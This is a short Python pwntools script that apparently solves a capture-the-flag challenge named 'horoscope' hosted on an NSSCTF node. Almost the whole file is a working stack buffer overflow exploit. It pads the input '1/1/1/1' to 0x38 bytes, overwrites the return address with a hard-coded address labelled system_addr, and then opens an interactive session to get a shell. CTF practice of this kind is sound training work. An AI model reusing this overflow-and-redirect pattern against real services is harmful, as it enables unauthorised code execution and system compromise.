from pwn import *

# io = process("./horoscope")

io = remote("node4.anna.nssctf.cn", 28782)

system_addr = 0x40095F

payload = b"1/1/1/1".ljust(0x30+8, b"a") + p64(system_addr);
io.sendline(payload)
io.interactive()
